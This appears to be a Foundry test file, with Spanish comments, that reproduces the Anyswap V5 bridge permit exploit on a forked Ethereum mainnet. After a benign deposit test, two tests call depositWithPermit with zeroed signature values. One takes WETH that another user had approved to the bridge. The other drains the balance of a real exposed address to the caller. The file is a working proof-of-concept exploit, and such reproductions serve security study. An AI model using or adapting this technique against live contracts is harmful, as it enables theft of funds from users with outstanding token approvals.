// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../../src/PoC/PoC_Hack_1/IAnyswapV5ERC20.sol";
import "../../../src/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

interface IWETH9 is IWETH {
    function permit(address target, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external payable;
    function transferWithPermit(address target, address to, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external payable returns (bool);
}

contract Tools {
    function transferSomeETH(address to, uint amount) internal returns (bool) {
        (bool success, ) = to.call{value: amount}("");
        return success;
    }

    function checkETHBalance(address account) internal {
        uint balancillo = account.balance;
        console.log("ETH: ", balancillo/1e18);
    }

    function checkTokenBalance(address _token, address account) internal {
        IERC20Metadata token = IERC20Metadata(_token);
        string memory name = token.name();
        uint balancillo = token.balanceOf(account);
        console.log(name, balancillo/1e18);
    }
}


contract AnyswapV5ERC20Test is Test, Tools {
    // Note: Block.number = 13906273 
    // Note: Function: testSimpleDeposit() usa el caso ideal donde el código funciona bien dentro de WETH9
    // Note: Las otras dos funciones estan probando el hack
    IAnyswapV5ERC20 public bridge;
    IWETH9 public weth;

    address public nullAddress;
    address public ana;
    address public kenat;

    address public addressExposed;


    function setUp() public {
        vm.createSelectFork(vm.envString("FOUNDRY_INFURA"));
        weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        bridge = IAnyswapV5ERC20(0xB153FB3d196A8eB25522705560ac152eeEc57901);
        addressExposed = address(0xC564EE9f21Ed8A2d8E7e76c085740d5e4c5FaFbE);
        ana = makeAddr("userAna");
        kenat = makeAddr("userKenat");
    }


    function testSimpleDeposit(uint8 _amount) public {
        vm.rollFork(13906273);   
        console.log("Contract address: ", address(this));
        //console.log("msg.sender: ", msg.sender);
        console.log(" ");

        //uint256 BridgeWETHBalanceInit = weth.balanceOf(address(bridge));
        //console.log("Amount 0: ", _amount);
        uint256 amount = uint256(_amount)*1e18;

        uint256 wethBalance0 = weth.balanceOf(kenat);

        vm.prank(address(this));
        transferSomeETH(kenat, amount);

        vm.prank(kenat);
        weth.deposit{value: amount}();

        uint256 wethBalanceInit = weth.balanceOf(kenat);

        vm.prank(kenat);
        weth.approve(address(bridge), amount);
        vm.prank(kenat);
        bridge.deposit(amount);

        //uint256 BridgeWETHBalanceFin = weth.balanceOf(address(bridge));
        uint256 wethBalanceMiddle = weth.balanceOf(kenat);
        

        /* console.log("Initial bridge balance: ", BridgeWETHBalanceInit);
        console.log("Final bridge balance: ", BridgeWETHBalanceFin);
        console.log(" "); */

        vm.prank(kenat);
        bridge.withdraw(amount);

        uint256 wethBalanceFin = weth.balanceOf(kenat);

        //console.log("Cero kenat balance: ", wethBalance0);
        //console.log("Init kenat balance: ", wethBalanceInit);
        //console.log("Middle kenat balance: ", wethBalanceMiddle);
        //console.log("Final kenat balance: ", wethBalanceFin);
        //console.log(" ");

        assertEq(wethBalanceInit, wethBalanceFin);
    }

    

    //function testWithPermitDeposit(uint8 _amount, uint256 _deadline, uint8 _v, bytes32 _r, bytes32 _s) public {
    function testDepositPermitDeposit(uint8 _amount) public {
        vm.rollFork(13906273);   
        uint256 amount = uint256(_amount)*1e18;
        //uint256 amount = 120 ether;
        uint256 amountToDeposit = amount/2;

        uint256 wethBalance0 = weth.balanceOf(kenat);

        vm.prank(address(this));
        transferSomeETH(kenat, amount);

        vm.prank(kenat);
        weth.deposit{value: amount}();

        uint256 wethBalanceInit = weth.balanceOf(kenat);

        vm.prank(kenat);
        weth.approve(address(bridge), type(uint256).max);
        vm.prank(kenat);
        bridge.deposit(amountToDeposit);

        uint256 wethBalanceMiddle = weth.balanceOf(kenat);


        // Attack
        vm.prank(ana);
        //bridge.depositWithPermit(kenat, wethBalanceMiddle, _deadline, _v, _r, _s, ana);
        // Estamos transfiriendo los fondos que kenat deposito en la linea "bridge.deposit(amountToDeposit)" hacía la cuenta de Ana, quien es quien esta ejecutando el hack
        bridge.depositWithPermit(   kenat, 
                                    wethBalanceMiddle, 
                                    0, 
                                    0x00, 
                                    0x0000000000000000000000000000000000000000000000000000000000000000, 
                                    0x0000000000000000000000000000000000000000000000000000000000000000, 
                                    ana);
        vm.prank(ana);
        bridge.withdraw();

 
        uint256 wethBalanceFin = weth.balanceOf(kenat);

        //console.log("Cero kenat balance: ", wethBalance0);
        //console.log("Init kenat balance: ", wethBalanceInit);
        //console.log("Middle kenat balance: ", wethBalanceMiddle);
        //console.log("Final kenat balance: ", wethBalanceFin);
        //console.log(" ");

        assertEq(wethBalanceFin, 0);
    }


    function testTransferPermitDeposit() public {
        vm.rollFork(13906273);   
        uint256 bridgeBalance0 = weth.balanceOf(address(bridge));
        uint256 wethBalance0 = weth.balanceOf(kenat);
        uint256 fantomBridgeBalance0 = weth.balanceOf(addressExposed);

        console.log("   Cero Bridge balance: ", bridgeBalance0);
        console.log("   Cero Kenat balance: ", wethBalance0);
        console.log("   Cero FantomBridge balance: ", fantomBridgeBalance0);
        console.log(" ");

        // Attack
        vm.prank(kenat);
        bridge.depositWithPermit(   addressExposed, 
                                            fantomBridgeBalance0, 
                                            block.timestamp + 300, 
                                            0x00, 
                                            0x0000000000000000000000000000000000000000000000000000000000000000, 
                                            0x0000000000000000000000000000000000000000000000000000000000000000, 
                                            kenat);   
        vm.prank(kenat);
        bridge.withdraw();                

        uint256 bridgeBalanceFin = weth.balanceOf(address(bridge));
        uint256 wethBalanceFin = weth.balanceOf(kenat);
        uint256 fantomBridgeBalanceFin = weth.balanceOf(addressExposed);

        console.log("   Fin Bridge balance: ", bridgeBalanceFin);
        console.log("   Fin Kenat balance: ", wethBalanceFin);
        console.log("   Fin FantomBridge balance: ", fantomBridgeBalanceFin);
        console.log(" ");




        //assertEq(bridgeBalanceMiddle, anaBalanceFin);
    }




}
